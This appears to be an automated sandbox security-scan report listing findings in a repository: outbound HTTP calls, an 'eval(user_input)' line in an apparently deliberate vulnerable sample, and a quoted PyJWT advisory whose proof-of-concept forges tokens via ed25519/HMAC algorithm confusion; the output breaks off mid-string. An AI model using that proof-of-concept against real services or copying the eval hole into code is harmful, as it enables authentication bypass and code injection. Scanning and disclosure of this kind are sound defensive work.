# Sandbox Inspection Report (Sun-09-Nov-2025-2101UTC-001)

**Time:** 2025-11-09 21:02:42 UTC

**Sandbox Status:** failed-high

**Exit Code:** 2

## Raw Output

```
### STDOUT
{
  "keywords": {
    "found": [
      "verify",
      "artefacts"
    ],
    "missing": []
  },
  "findings": [
    {
      "pattern": "python_requests",
      "severity": "medium",
      "description": "Python performs outbound network requests via requests library",
      "file": "/tmp/mcp_semgrep_l9q0li0z/repo/sast/complete_run_audit.py",
      "line": 90,
      "excerpt": "response = requests.post(url, headers=headers, json=payload)"
    },
    {
      "pattern": "python_requests",
      "severity": "medium",
      "description": "Python performs outbound network requests via requests library",
      "file": "/tmp/mcp_semgrep_l9q0li0z/repo/sast/main.py",
      "line": 39,
      "excerpt": "response = requests.post(url, headers=headers, json=payload)"
    },
    {
      "pattern": "python_requests",
      "severity": "medium",
      "description": "Python performs outbound network requests via requests library",
      "file": "/tmp/mcp_semgrep_l9q0li0z/repo/sast/upload_blob_storage.py",
      "line": 25,
      "excerpt": "resp = requests.post("
    },
    {
      "pattern": "python_requests",
      "severity": "medium",
      "description": "Python performs outbound network requests via requests library",
      "file": "/tmp/mcp_semgrep_l9q0li0z/repo/sast/upload_blob_storage.py",
      "line": 48,
      "excerpt": "put_resp = requests.put("
    },
    {
      "pattern": "python_requests",
      "severity": "medium",
      "description": "Python performs outbound network requests via requests library",
      "file": "/tmp/mcp_semgrep_l9q0li0z/repo/sast/upload_blob_storage.py",
      "line": 59,
      "excerpt": "resp_read = requests.post("
    },
    {
      "pattern": "python_requests",
      "severity": "medium",
      "description": "Python performs outbound network requests via requests library",
      "file": "/tmp/mcp_semgrep_l9q0li0z/repo/sast/start_run_audit.py",
      "line": 48,
      "excerpt": "response = requests.post(f\"{SAST_SCAN_RESULT_API_URL}/start_run\", json=payload, headers=headers)"
    },
    {
      "pattern": "python_requests",
      "severity": "medium",
      "description": "Python performs outbound network requests via requests library",
      "file": "/tmp/mcp_semgrep_l9q0li0z/repo/sast/update_run_audit.py",
      "line": 45,
      "excerpt": "response = requests.post(url, json=payload, headers=headers)"
    },
    {
      "pattern": "python_requests",
      "severity": "medium",
      "description": "Python performs outbound network requests via requests library",
      "file": "/tmp/mcp_semgrep_l9q0li0z/repo/sast/initialise_run.py",
      "line": 28,
      "excerpt": "resp = requests.post("
    },
    {
      "pattern": "python_eval_exec",
      "severity": "high",
      "description": "Python uses eval/exec, which can execute untrusted code",
      "file": "/tmp/mcp_semgrep_l9q0li0z/repo/sast/python/project/badpython.py",
      "line": 7,
      "excerpt": "eval(user_input)"
    },
    {
      "pattern": "generic_private_key",
      "severity": "high",
      "description": "File appears to contain a private key block",
      "file": "/tmp/mcp_semgrep_l9q0li0z/repo/sast/python/project/run/PyPI/vulnerabilities.jsonl",
      "line": 366483,
      "excerpt": "\"details\": \"### Impact\\n_What kind of vulnerability is it? Who is impacted?_\\n\\nDisclosed by Aapo Oksman (Senior Security Specialist, Nixu Corporation).\\n\\n> PyJWT supports multiple different JWT signing algorithms. With JWT, an \\n> attacker submitting the JWT token can choose the used signing algorithm.\\n> \\n> The PyJWT library requires that the application chooses what algorithms \\n> are supported. The application can specify \\n> \\\"jwt.algorithms.get_default_algorithms()\\\" to get support for all \\n> algorithms. They can also specify a single one of them (which is the \\n> usual use case if calling jwt.decode directly. However, if calling \\n> jwt.decode in a helper function, all algorithms might be enabled.)\\n> \\n> For example, if the user chooses \\\"none\\\" algorithm and the JWT checker \\n> supports that, there will be no signature checking. This is a common \\n> security issue with some JWT implementations.\\n> \\n> PyJWT combats this by requiring that the if the \\\"none\\\" algorithm is \\n> used, the key has to be empty. As the key is given by the application \\n> running the checker, attacker cannot force \\\"none\\\" cipher to be used.\\n> \\n> Similarly with HMAC (symmetric) algorithm, PyJWT checks that the key is \\n> not a public key meant for asymmetric algorithm i.e. HMAC cannot be used \\n> if the key begins with \\\"ssh-rsa\\\". If HMAC is used with a public key, the \\n> attacker can just use the publicly known public key to sign the token \\n> and the checker would use the same key to verify.\\n> \\n>  From PyJWT 2.0.0 onwards, PyJWT supports ed25519 asymmetric algorithm. \\n> With ed25519, PyJWT supports public keys that start with \\\"ssh-\\\", for \\n> example \\\"ssh-ed25519\\\".\\n\\n```python\\nimport jwt\\nfrom cryptography.hazmat.primitives import serialization\\nfrom cryptography.hazmat.primitives.asymmetric import ed25519\\n\\n# Generate ed25519 private key\\nprivate_key = ed25519.Ed25519PrivateKey.generate()\\n\\n# Get private key bytes as they would be stored in a file\\npriv_key_bytes = \\nprivate_key.private_bytes(encoding=serialization.Encoding.PEM,format=serialization.PrivateFormat.PKCS8, \\nencryption_algorithm=serialization.NoEncryption())\\n\\n# Get public key bytes as they would be stored in a file\\npub_key_bytes = \\nprivate_key.public_key().public_bytes(encoding=serialization.Encoding.OpenSSH,format=serialization.PublicFormat.OpenSSH)\\n\\n# Making a good jwt token that should work by signing it with the \\nprivate key\\nencoded_good = jwt.encode({\\\"test\\\": 1234}, priv_key_bytes, algorithm=\\\"EdDSA\\\")\\n\\n# Using HMAC with the public key to trick the receiver to think that the \\npublic key is a HMAC secret\\nencoded_bad = jwt.encode({\\\"test\\\": 1234}, pub_key_bytes, algorithm=\\\"HS256\\\")\\n\\n# Both of the jwt tokens are validated as valid\\ndecoded_good = jwt.decode(encoded_good, pub_key_bytes, \\nalgorithms=jwt.algorithms.get_default_algorithms())\\ndecoded_bad = jwt.decode(encoded_bad, pub_key_bytes, \\nalgorithms=jwt.algorithms.get_default_algorithms())\\n\\nif decoded_good == decoded_bad:\\n \u00a0\u00a0\u00a0 print(\\\"POC Successfull\\\")\\n\\n# Of course the receiver should specify ed25519 algorithm to be used if \\nthey specify ed25519 public key. However, if other algorithms are used, \\nthe POC does not work\\n# HMAC specifies illegal strings for the HMAC secret in jwt/algorithms.py\\n#\\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 invalid_strings = [\\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 b\\\"-----BEGIN PUBLIC KEY-----\\\",\\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 b\\\"-----BEGIN CERTIFICATE-----\\\",\\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 b\\\"-----BEGIN RSA PUBLIC KEY-----\\\",\\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 b\\\"ssh-rsa\\\",\\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 ]\\n#\\n# However, OKPAlgorithm (ed25519) accepts the following in \\njwt/algorithms.py:\\n#\\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 if \\\"-----BEGIN PUBLIC\\\" in str_key:\\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 return load_pem_public_key(key)\\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 if \\\"-----BEGIN PRIVATE\\\" in str_key:\\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 return load_pem_private_key(key, password=None)\\n#\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0 if str_key[0:4
```
